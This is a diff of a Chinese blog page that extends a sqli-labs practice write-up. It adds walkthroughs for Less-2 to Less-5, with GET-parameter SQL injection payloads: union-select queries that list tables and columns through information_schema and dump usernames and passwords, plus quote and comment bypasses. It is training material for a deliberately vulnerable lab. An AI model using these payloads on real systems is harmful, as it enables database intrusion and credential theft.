@@ -451,21 +451,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2022-03-14
+                    2022-03-15
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    225
+                    537
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    1 分
+                    2 分
                 </div>
                 
 
@@ -486,7 +486,7 @@
         <div class="card-content article-card-content">
             <div id="articleContent">
                 <h3 id="1、Less-1"><a href="#1、Less-1" class="headerlink" title="1、Less-1"></a>1、Less-1</h3><p>From:<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45728976/article/details/103932264">https://blog.csdn.net/weixin_45728976/article/details/103932264</a></p>
-<p>单引号的字符型</p>
+<p>基于GET的单引号的字符型</p>
 <p>（1）注入字符的判断</p>
 <p><code>?id=1</code></p>
 <p><img src="https://gitee.com/mie1732/emc/raw/master/img/202203142157884.png" alt="单引号"></p>
@@ -510,6 +510,41 @@
 <p>（7）查询password列下的信息</p>
 <p><code>?id=-1&#39; union select 1,2,group_concat(password) from users --+</code></p>
 <p><img src="https://gitee.com/mie1732/emc/raw/master/img/202203142227554.png" alt="列下的信息"></p>
+<h3 id="2、Less2"><a href="#2、Less2" class="headerlink" title="2、Less2"></a>2、Less2</h3><p>基于GET的整型</p>
+<p>（1）注入字符判断</p>
+<p><code>?id=1 and 1=1</code>在返回的语句中可以发现是整型</p>
+<p><img src="https://gitee.com/mie1732/emc/raw/master/img/202203150819837.png" alt="整型"></p>
+<p>（2）字段判断<code>order by</code></p>
+<p><code>?id=1 order by 4</code>可知一共有三个字段</p>
+<p><img src="https://gitee.com/mie1732/emc/raw/master/img/202203150822126.png" alt="字段判断"></p>
+<p>（3）注入点判断</p>
+<p><code>?id=-1 union select 1,2,3</code>这里注入点的判断需要报错，可知2,3为注入点</p>
+<p><img src="https://gitee.com/mie1732/emc/raw/master/img/202203150823795.png" alt="2和3"></p>
+<p>（4）数据库信息查询</p>
+<p><code>?id=-1 union select 1,database(),user()</code></p>
+<p><img src="https://gitee.com/mie1732/emc/raw/master/img/202203150825771.png" alt="数据库名，用户"></p>
+<p>（5）在security数据库下的表信息查询</p>
+<p><code>?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;</code></p>
+<p><img src="https://gitee.com/mie1732/emc/raw/master/img/202203150828657.png" alt="该数据库下的表"></p>
+<p>（6）查询users表下的列信息</p>
+<p><code>?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;</code></p>
+<p><img src="https://gitee.com/mie1732/emc/raw/master/img/202203150829894.png" alt="users表下的列信息"></p>
+<p>（7）查询users表下password列下的password、username</p>
+<p><code>?id=-1 union select 1,group_concat(username),group_concat(password) from users</code></p>
+<p><img src="https://gitee.com/mie1732/emc/raw/master/img/202203150832991.png" alt="列下信息"></p>
+<h3 id="3、Less3"><a href="#3、Less3" class="headerlink" title="3、Less3"></a>3、Less3</h3><p>基于GET的<code>&#39;)</code>的字符型</p>
+<p><code>?id=1 and 1=1</code>可以发现是单引号和括号的组合字符</p>
+<p><img src="https://gitee.com/mie1732/emc/raw/master/img/202203150836927.png" alt="单引号变形"></p>
+<p>于是用<code>?id=1&#39;) and 1=1%23</code>进行绕过，这里是GET型参数因此无法用<code>#</code>号，因此可以用<code>#</code>的URL编码<code>%23</code>进行注释</p>
+<p><img src="https://gitee.com/mie1732/emc/raw/master/img/202203150841620.png" alt="%23"></p>
+<p>接下来再用基本方法查询即可</p>
+<h3 id="4、Less4"><a href="#4、Less4" class="headerlink" title="4、Less4"></a>4、Less4</h3><p>基于GET的双引号和括号字符型</p>
+<p><code>?id=1 and 1=1</code></p>
+<p><img src="https://gitee.com/mie1732/emc/raw/master/img/202203150852038.png" alt="双引号括号"></p>
+<p><code>?id=1&#39;&#39;) and 1=1--+</code></p>
+<img src="https://gitee.com/mie1732/emc/raw/master/img/202203150853230.png" alt="绕过" style="zoom:67%;" />
+
+<h3 id="5、Less5"><a href="#5、Less5" class="headerlink" title="5、Less5"></a>5、Less5</h3><p>基于GET的单引号错误回显注入</p>
 
                 
             </div>
@@ -621,43 +656,41 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="far fa-dot-circle"></i>&nbsp;本篇
-            </div>
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2022/03/14/sqli-labs-1/">
+                <a href="/2022/03/17/web-SQL%E6%B3%A8%E5%85%A5%EF%BC%884%EF%BC%89/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/16.jpg" class="responsive-img" alt="sqli-labs(1)">
+                        <img src="/medias/featureimages/13.jpg" class="responsive-img" alt="web-SQL注入（4）">
                         
-                        <span class="card-title">sqli-labs(1)</span>
+                        <span class="card-title">web-SQL注入（4）</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            SQL注入练习
+                            SQL注入，Oracle,MongoDB等注入
                         
                     </div>
                     <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-03-14
-                            </span>
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2022-03-17
+                        </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/sqli-labs/" class="post-category">
-                                    sqli-labs
+                            <a href="/categories/%E5%B0%8F%E8%BF%AA%E6%B8%97%E9%80%8F/" class="post-category">
+                                    小迪渗透
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
-
                 
                 <div class="card-action article-tags">
                     
@@ -915,7 +948,7 @@
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">16.6k</span>
+                        class="white-color">17.2k</span>
             
             
             
